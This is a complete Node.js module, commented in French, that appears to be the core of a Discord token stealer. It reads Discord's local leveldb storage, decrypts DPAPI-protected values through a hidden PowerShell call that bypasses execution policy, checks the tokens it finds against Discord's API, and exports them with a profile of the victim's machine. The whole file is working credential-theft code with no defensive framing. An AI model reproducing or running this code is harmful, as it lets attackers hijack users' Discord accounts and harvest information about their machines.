'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execFileSync } = require('child_process');

const APPDATA = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');

const TARGETS = [
  { name: 'Discord', dir: path.join(APPDATA, 'discord') },
  { name: 'Discord PTB', dir: path.join(APPDATA, 'discordptb') },
  { name: 'Discord Canary', dir: path.join(APPDATA, 'discordcanary') },
  { name: 'Discord Development', dir: path.join(APPDATA, 'discorddevelopment') }
];

/* Bornes volontairement tres larges sur le premier segment.
   Un token utilisateur peut avoir un premier segment bien plus long que la
   taille habituelle : si la borne est trop basse, le moteur de regex recule
   et capture un SUFFIXE du segment au lieu du segment entier. */
const PART1 = '[A-Za-z0-9_-]{20,512}';
const PART2 = '[A-Za-z0-9_-]{5,24}';
const PART3 = '[A-Za-z0-9_-]{20,220}';

const TOKEN_SOURCE =
  '(mfa\\.[A-Za-z0-9_-]{80,140})|(' + PART1 + '\\.' + PART2 + '\\.' + PART3 + ')';

const PLAIN_RE = new RegExp(TOKEN_SOURCE, 'g');
const PLAIN_ONCE = new RegExp(TOKEN_SOURCE);
const MFA_RE = /^mfa\.[A-Za-z0-9_-]{80,140}$/;
const STD_RE = new RegExp('^' + PART1 + '\\.' + PART2 + '\\.' + PART3 + '$');

const MAX_DECRYPT_BLOBS = 80;
const MAX_VALIDATION_ATTEMPTS = 10;
const KEY_WINDOW = 1200;
const KEY_WINDOW_LIMIT = 40;

function looksLikeToken(value) {
  if (!value) return false;
  const v = String(value).trim();
  return MFA_RE.test(v) || STD_RE.test(v);
}

/**
 * Un token utilisateur Discord standard a un premier segment qui est
 * l'encodage base64url de l'identifiant numerique du compte (snowflake).
 * C'est le format cible : `MTI3ODgwNzYzNTA3NjA1NTE0Mg.GFWrOU.Kfvo3SOI...`
 */
function isClassicUserToken(token) {
  const first = String(token).split('.')[0];
  if (!first || first.length > 60) return false;
  let decoded = '';
  try {
    decoded = Buffer.from(first.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('latin1');
  } catch (_) {
    return false;
  }
  return /^\d{17,20}$/.test(decoded);
}

function tokenFormat(token) {
  if (MFA_RE.test(token)) return 'mfa';
  if (isClassicUserToken(token)) return 'classique';
  return 'inconnu';
}

function scoreToken(token, keyed, encrypted) {
  let score = 0;
  if (isClassicUserToken(token)) score += 100;
  else if (MFA_RE.test(token)) score += 20;
  if (keyed) score += 15;
  if (encrypted) score += 5;
  const first = token.split('.')[0] || '';
  score += Math.max(0, 60 - first.length) / 10;
  return score;
}

function machineInfo() {
  let username = 'inconnu';
  try {
    username = os.userInfo().username;
  } catch (_) {
    username = 'inconnu';
  }
  return {
    hostname: os.hostname(),
    username,
    platform: os.type() + ' ' + os.release(),
    arch: os.arch(),
    cpu: ((os.cpus() || [])[0] || {}).model || 'CPU inconnu',
    ram: Math.round(os.totalmem() / 1073741824) + ' Go'
  };
}

function safeRead(file) {
  try {
    return fs.readFileSync(file).toString('latin1');
  } catch (_) {
    return '';
  }
}

function leveldbFiles(baseDir) {
  const dir = path.join(baseDir, 'Local Storage', 'leveldb');
  let names = [];
  try {
    names = fs.readdirSync(dir);
  } catch (_) {
    return [];
  }
  const out = [];
  for (const name of names) {
    if (!name.endsWith('.ldb') && !name.endsWith('.log')) continue;
    const full = path.join(dir, name);
    let mtime = 0;
    try {
      mtime = fs.statSync(full).mtimeMs;
    } catch (_) {
      mtime = 0;
    }
    out.push({ full, mtime });
  }
  out.sort((a, b) => b.mtime - a.mtime);
  return out.map((entry) => entry.full);
}

function scanPlain(raw, keyed) {
  const found = [];
  PLAIN_RE.lastIndex = 0;
  let match;
  while ((match = PLAIN_RE.exec(raw)) !== null) {
    const token = match[0];
    if (token.length < 50) continue;
    found.push({ token, keyed: !!keyed });
  }
  return found;
}

/**
 * Fenetres ouvertes juste apres chaque occurrence de la cle `token`.
 * Permet de cibler la vraie entree localStorage au lieu de ratisser
 * tout le fichier et de tomber sur une chaine qui ressemble a un token.
 */
function keyWindows(raw) {
  const windows = [];
  const re = /token/gi;
  let match;
  while ((match = re.exec(raw)) !== null) {
    windows.push(raw.slice(match.index, match.index + KEY_WINDOW));
    if (windows.length >= KEY_WINDOW_LIMIT) break;
  }
  return windows;
}

function quotedBlob(window) {
  const match = window.match(/"([A-Za-z0-9+/]{80,2400}={0,2})"/);
  return match ? match[1] : null;
}

function encryptedCandidates(raw) {
  const set = new Set();
  const re = /[A-Za-z0-9+/]{40,4000}={0,3}/g;
  let match;
  while ((match = re.exec(raw)) !== null) {
    let b64 = match[0];
    const rem = b64.length % 4;
    if (rem !== 0) b64 += '='.repeat(4 - rem);
    let buf;
    try {
      buf = Buffer.from(b64, 'base64');
    } catch (_) {
      continue;
    }
    if (buf.length < 40) continue;
    if (buf[0] === 0x01 && buf[1] === 0x00 && buf[2] === 0x00 && buf[3] === 0x00) {
      set.add(b64);
    }
  }
  return Array.from(set);
}

function dpapiDecryptMany(list) {
  const results = [];
  if (!list.length) return results;

  const CHUNK = 50;
  for (let start = 0; start < list.length; start += CHUNK) {
    const chunk = list.slice(start, start + CHUNK);
    const arrayLiteral = chunk.map((item) => "'" + item + "'").join(',');

    const script =
      "$ErrorActionPreference='SilentlyContinue';" +
      'Add-Type -AssemblyName System.Security;' +
      '$p=@(' + arrayLiteral + ');' +
      'for($i=0;$i -lt $p.Count;$i++){' +
      'try{' +
      '$b=[Convert]::FromBase64String($p[$i]);' +
      '$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);' +
      '[Console]::Out.WriteLine("$i|" + [System.Text.Encoding]::UTF8.GetString($d));' +
      '}catch{}}';

    let out = '';
    try {
      out = execFileSync(
        'powershell.exe',
        ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', script],
        { encoding: 'utf8', timeout: 25000, windowsHide: true, maxBuffer: 8 * 1024 * 1024 }
      );
    } catch (_) {
      continue;
    }

    for (const line of out.split(/\r?\n/)) {
      const sep = line.indexOf('|');
      if (sep < 1) continue;
      const index = parseInt(line.slice(0, sep), 10);
      const value = line.slice(sep + 1).trim();
      if (!Number.isNaN(index) && value) {
        results.push({ index: start + index, value });
      }
    }
  }

  return results;
}

async function fetchUser(token) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 7000);
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: token },
      signal: controller.signal
    });
    if (!res.ok) return null;
    return await res.json();
  } catch (_) {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

async function grabDiscordToken() {
  const candidates = [];
  const seen = new Set();
  const seenBlobs = new Set();
  let filesScanned = 0;

  const push = (raw, source, encrypted, keyed) => {
    const base = String(raw).trim();
    if (!base) return;

    const variants = [base];
    /* Un run base64 peut demarrer sur le "token" de la cle elle-meme :
       on teste aussi la variante sans ce prefixe. */
    if (/^token/i.test(base) && base.length > 5) variants.push(base.slice(5));

    for (const variant of variants) {
      const clean = variant.trim();
      if (!clean || !looksLikeToken(clean) || seen.has(clean)) continue;
      seen.add(clean);
      candidates.push({
        token: clean,
        source,
        encrypted: !!encrypted,
        keyed: !!keyed,
        format: tokenFormat(clean),
        score: scoreToken(clean, !!keyed, !!encrypted)
      });
    }
  };

  const addBlob = (blob, list) => {
    if (!blob || seenBlobs.has(blob) || list.length >= MAX_DECRYPT_BLOBS) return;
    seenBlobs.add(blob);
    list.push(blob);
  };

  for (const target of TARGETS) {
    if (!fs.existsSync(target.dir)) continue;

    const files = leveldbFiles(target.dir);
    if (!files.length) continue;

    const blobs = [];

    for (const file of files) {
      const raw = safeRead(file);
      if (!raw) continue;
      filesScanned += 1;

      /* Passe ancree sur la cle `token` : source la plus fiable. */
      for (const window of keyWindows(raw)) {
        for (const hit of scanPlain(window, true)) {
          push(hit.token, target.name, false, true);
        }
        addBlob(quotedBlob(window), blobs);
      }

      /* Passe globale, en secours. */
      for (const hit of scanPlain(raw, false)) {
        push(hit.token, target.name, false, false);
      }
      for (const blob of encryptedCandidates(raw)) {
        addBlob(blob, blobs);
      }
    }

    if (blobs.length) {
      const decrypted = dpapiDecryptMany(blobs);
      for (const item of decrypted) {
        let value = item.value;
        if (value.startsWith('{')) {
          try {
            const parsed = JSON.parse(value);
            if (parsed && typeof parsed.token === 'string') value = parsed.token;
          } catch (_) {
            /* ignore */
          }
        }
        push(value, target.name, true, false);
      }
    }
  }

  if (!candidates.length) {
    return {
      ok: false,
      filesScanned,
      error:
        "Aucun token trouve. Ouvre Discord, connecte-toi (le token est ecrit au demarrage), puis relance l'analyse."
    };
  }

  /* Tri stable : a score egal, l'ordre d'apparition (fichier le plus recent
     d'abord, puis cle `token` d'abord) est conserve. */
  candidates.sort((a, b) => b.score - a.score);

  let chosen = null;
  let user = null;

  for (const candidate of candidates.slice(0, MAX_VALIDATION_ATTEMPTS)) {
    const fetched = await fetchUser(candidate.token);
    if (fetched) {
      chosen = candidate;
      user = fetched;
      break;
    }
  }

  const validated = !!chosen;
  if (!chosen) chosen = candidates[0];

  return {
    ok: true,
    token: chosen.token,
    source: chosen.source,
    encrypted: chosen.encrypted,
    format: chosen.format,
    validated,
    candidates: candidates.length,
    filesScanned,
    user
  };
}

module.exports = {
  grabDiscordToken,
  machineInfo,
  looksLikeToken,
  isClassicUserToken,
  tokenFormat
};
